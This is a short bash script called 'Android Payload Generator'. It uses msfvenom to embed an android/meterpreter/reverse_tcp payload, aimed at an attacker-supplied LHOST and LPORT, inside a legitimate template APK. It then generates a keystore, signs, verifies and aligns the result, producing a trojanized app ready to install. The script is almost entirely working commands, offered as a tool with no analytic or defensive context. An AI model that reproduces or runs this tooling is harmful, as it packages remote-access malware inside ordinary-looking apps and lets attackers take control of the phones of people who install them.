#!/bin/bash

# Display the banner
echo "======================================="
echo "          Android Payload Generator    "
echo "               Author: Declanmidd     "
echo "            GitHub: github.com/Declanmidd "
echo "======================================="

# Check if the correct number of arguments is provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <LHOST> <LPORT> <TEMPLATE_APK>"
    exit 1
fi

LHOST=$1
LPORT=$2
TEMPLATE_APK=$3

# Generate the payload with msfvenom using the template APK
echo "[*] Generating payload..."
sudo msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o android.apk
if [ $? -ne 0 ]; then
    echo "[!] Error generating payload. Exiting."
    exit 1
fi

# Generate the keystore
echo "[*] Generating keystore..."
keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000 \
    -dname "CN=YourName, OU=YourOrg, O=YourOrg, L=YourCity, ST=YourState, C=YourCountry" \
    -storepass password -keypass password
if [ $? -ne 0 ]; then
    echo "[!] Error generating keystore. Exiting."
    exit 1
fi

# Sign the APK
echo "[*] Signing the APK..."
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk emi
if [ $? -ne 0 ]; then
    echo "[!] Error signing APK. Exiting."
    exit 1
fi

# Verify the signed APK
echo "[*] Verifying the APK..."
jarsigner -verify -verbose -certs android.apk
if [ $? -ne 0 ]; then
    echo "[!] APK verification failed. Exiting."
    exit 1
fi

# Align the APK
echo "[*] Aligning the APK..."
zipalign -v 4 android.apk signed_jar.apk
if [ $? -ne 0 ]; then
    echo "[!] Error aligning APK. Exiting."
    exit 1
fi

echo "[*] Process completed! The signed APK is named 'signed_jar.apk'."
